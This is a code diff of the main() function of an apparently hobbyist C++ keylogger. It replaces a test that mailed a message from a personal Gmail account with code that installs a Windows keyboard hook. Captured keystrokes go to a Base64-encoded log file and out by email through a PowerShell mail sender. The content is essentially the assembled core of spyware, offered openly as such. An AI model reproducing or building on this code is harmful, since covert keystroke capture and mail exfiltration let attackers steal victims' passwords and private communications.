@@ -1,41 +1,29 @@
-#include <iostream>
-
-#include "CurlMailSender.h"
+#include "Base64Encryptor.h"
 #include "DefaultFileSystemAccess.h"
+#include "KeyboardHook.h"
 #include "PowerShellMailSender.h"
 
 int main()
 {
-    keylogger::mail::PowerShellMailSender mailSender{
-        std::make_unique<keylogger::mail::PowerShellSendMailScriptCreator>(
-            std::make_shared<keylogger::DefaultFileSystemAccess>())};
-    keylogger::mail::Mail mail{"michalovskyyy@gmail.com",
-                               "michalovskyyy@gmail.com",
-                               "elo",
-                               "witam pana",
-                               {}};
-    keylogger::mail::Credentials credentials{"michalovskyyy@gmail.com", "xxx"};
-    auto result = mailSender.sendMail(mail, credentials);
-    if (result)
+    MSG message;
+
+    using namespace keylogger;
+    using namespace keylogger::mail;
+
+    std::shared_ptr<FileSystemAccess> fileSystem = std::make_shared<keylogger::DefaultFileSystemAccess>();
+    std::unique_ptr<MailSender> mailSender =
+        std::make_unique<PowerShellMailSender>(std::make_unique<PowerShellSendMailScriptCreator>(fileSystem));
+    KeyboardHook hook{std::move(mailSender),
+                      std::make_unique<UserInputFileLogger>(fileSystem, std::make_unique<Base64Encryptor>())};
+
+    hook.installHook();
+
+    while (GetMessage(&message, nullptr, 0, 0))
     {
-        std::cerr << "mail sent";
-        return 0;
+        TranslateMessage(&message);
+        DispatchMessage(&message);
     }
-    return 1;
-    // MSG message;
 
-    // using namespace keylogger;
-    // FileSystemHandler::createDirectory(FileSystemHandler::getCurrentPath(true));
-
-    // KeyboardHook hook;
-
-    // hook.installHook();
-
-    // while (GetMessage(&message, nullptr, 0, 0))
-    //{
-    //	TranslateMessage(&message);
-    //	DispatchMessage(&message);
-    //}
-
-    // hook.uninstallHook();
+    hook.uninstallHook();
+    return 0;
 }
